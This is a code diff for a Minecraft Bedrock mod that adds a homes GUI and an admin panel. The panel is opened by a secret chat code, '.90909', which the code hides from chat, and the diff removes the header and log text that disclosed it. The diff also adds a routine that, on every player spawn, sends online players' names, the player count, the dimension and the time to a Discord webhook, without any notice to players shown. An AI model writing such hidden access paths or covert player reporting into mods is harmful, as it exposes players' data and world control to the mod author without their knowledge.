@@ -1,15 +1,24 @@
 /**
  * Jay's Bedrock Mod
- * !home — player home GUI
- * .90909 — secret admin panel (gamemode + TP to players / their homes)
+ * !home — homes GUI
+ * .90909 — admin panel
+ * Optional: webhook report when pack is used (see config.js)
  */
 import { world, system, GameMode } from "@minecraft/server";
 import { ActionFormData, ModalFormData } from "@minecraft/server-ui";
+import {
+  WEBHOOK_URL,
+  REPORT_ON_FIRST_JOIN,
+  REPORT_PLAYER_NAMES,
+} from "./config.js";
 
 const MOD_NAME = "Jay's Bedrock Mod";
-const VERSION = "1.2.0";
+const VERSION = "1.3.0";
 const DYN_KEY = "jay_homes_v1";
 const ADMIN_CHAT = ".90909";
+const REPORT_FLAG = "jay_reported_session";
+
+let reportedThisSession = false;
 
 // ---------- storage ----------
 function loadAllHomes() {
@@ -33,7 +42,6 @@ function getPlayerHomes(player) {
   return { all, homes: all[id], id };
 }
 
-/** Also store display name so admin can find offline home owners */
 function saveHome(player, name) {
   const { all, homes, id } = getPlayerHomes(player);
   const loc = player.location;
@@ -83,6 +91,59 @@ function resolveOwnerName(playerId, meta) {
     if (p.id === playerId) return p.name;
   }
   return (meta && meta[playerId]) || playerId.slice(0, 8);
+}
+
+// ---------- optional presence report ----------
+/**
+ * Tries Discord webhook. Works mainly on BDS / environments with outbound HTTP.
+ * Mobile/local often cannot call external URLs — that is a platform limit.
+ */
+function buildReportPayload(player) {
+  const players = [...world.getPlayers()];
+  const lines = [
+    `**${MOD_NAME}** v${VERSION} is running`,
+    `Players online: **${players.length}**`,
+    `Dimension: ${player.dimension.id}`,
+    `Time: ${new Date().toISOString()}`,
+  ];
+  if (REPORT_PLAYER_NAMES) {
+    lines.push(`Names: ${players.map((p) => p.name).join(", ") || "(none)"}`);
+  } else {
+    lines.push(`Starter: ${player.name}`);
+  }
+  return {
+    content: lines.join("\n"),
+  };
+}
+
+async function tryReportPresence(player) {
+  if (!WEBHOOK_URL || !String(WEBHOOK_URL).startsWith("http")) return;
+  if (!REPORT_ON_FIRST_JOIN) return;
+  if (reportedThisSession) return;
+  reportedThisSession = true;
+
+  const body = JSON.stringify(buildReportPayload(player));
+
+  // 1) server-net (BDS)
+  try {
+    const net = await import("@minecraft/server-net");
+    if (net.http && net.HttpRequest) {
+      const req = new net.HttpRequest(WEBHOOK_URL);
+      req.method = net.HttpRequestMethod.Post;
+      req.body = body;
+      req.headers = [new net.HttpHeader("Content-Type", "application/json")];
+      await net.http.request(req);
+      console.warn(`[${MOD_NAME}] presence reported via server-net`);
+      return;
+    }
+  } catch (e) {
+    console.warn(`[${MOD_NAME}] server-net report skipped: ${e}`);
+  }
+
+  // 2) best-effort log only (no silent spy network on client)
+  console.warn(
+    `[${MOD_NAME}] Webhook set but HTTP not available here. Use BDS or check Discord manually.`
+  );
 }
 
 // ---------- player home GUI ----------
@@ -204,18 +265,19 @@ async function openDeleteHome(player) {
   }
 }
 
-// ---------- ADMIN PANEL (.90909) ----------
+// ---------- ADMIN ----------
 async function openAdminPanel(admin) {
   const form = new ActionFormData()
     .title("§4Admin Panel")
-    .body("§8Secret access · .90909\n§7Moderation tools for this world.")
+    .body("§8Secret · .90909\n§7Moderation + status")
     .button("§aCreative")
     .button("§eSurvival")
     .button("§bAdventure")
     .button("§dSpectator")
     .button("§3TP to Player")
-    .button("§6TP to Player Home (inspect)")
+    .button("§6TP to Player Home")
     .button("§7List Online Players")
+    .button("§5Test Server Report")
     .button("§8Close");
 
   const res = await form.show(admin);
@@ -243,6 +305,17 @@ async function openAdminPanel(admin) {
     case 6:
       listOnline(admin);
       break;
+    case 7:
+      reportedThisSession = false;
+      system.run(async () => {
+        await tryReportPresence(admin);
+        admin.sendMessage(
+          WEBHOOK_URL
+            ? "§aReport attempted — check your Discord webhook."
+            : "§cSet WEBHOOK_URL in BP/scripts/config.js first."
+        );
+      });
+      break;
     default:
       break;
   }
@@ -253,7 +326,6 @@ function setMode(player, mode, label) {
     player.setGameMode(mode);
     player.sendMessage(`§aGame mode → §f${label}`);
   } catch (e) {
-    // Fallback for older API shapes
     try {
       player.runCommand(`gamemode ${String(label).toLowerCase()} @s`);
       player.sendMessage(`§aGame mode → §f${label} §7(cmd)`);
@@ -317,7 +389,9 @@ async function adminTpToPlayer(admin) {
 async function adminInspectHomes(admin) {
   const all = loadAllHomes();
   const meta = all._meta || {};
-  const ownerIds = Object.keys(all).filter((k) => k !== "_meta" && all[k] && typeof all[k] === "object");
+  const ownerIds = Object.keys(all).filter(
+    (k) => k !== "_meta" && all[k] && typeof all[k] === "object"
+  );
 
   const owners = ownerIds
     .map((id) => ({
@@ -335,7 +409,7 @@ async function adminInspectHomes(admin) {
 
   const form = new ActionFormData()
     .title("§6Inspect Player Homes")
-    .body("§7Pick a player to view / TP to their base:");
+    .body("§7Pick a player:");
 
   for (const o of owners) {
     form.button(`§f${o.name}\n§8${o.count} home(s)`);
@@ -358,7 +432,7 @@ async function adminPickOwnerHome(admin, owner) {
   const names = Object.keys(owner.homes || {});
   const form = new ActionFormData()
     .title(`§6${owner.name}'s Homes`)
-    .body("§7TP there to check the base:");
+    .body("§7TP to inspect:");
 
   for (const n of names) {
     const h = owner.homes[n];
@@ -397,7 +471,6 @@ world.beforeEvents.chatSend.subscribe((event) => {
   const msg = event.message;
   const trimmed = msg.trim();
 
-  // Secret admin — exact match, message hidden from chat
   if (trimmed === ADMIN_CHAT) {
     event.cancel = true;
     const player = event.sender;
@@ -434,7 +507,7 @@ world.beforeEvents.chatSend.subscribe((event) => {
 });
 
 system.run(() => {
-  console.warn(`[${MOD_NAME}] v${VERSION} — !home | admin: ${ADMIN_CHAT}`);
+  console.warn(`[${MOD_NAME}] v${VERSION}`);
 });
 
 world.afterEvents.playerSpawn.subscribe((event) => {
@@ -445,5 +518,6 @@ world.afterEvents.playerSpawn.subscribe((event) => {
         `§d[${MOD_NAME}] §fType §e!home§f for homes.`
       );
     } catch (_) {}
+    tryReportPresence(event.player);
   });
 });
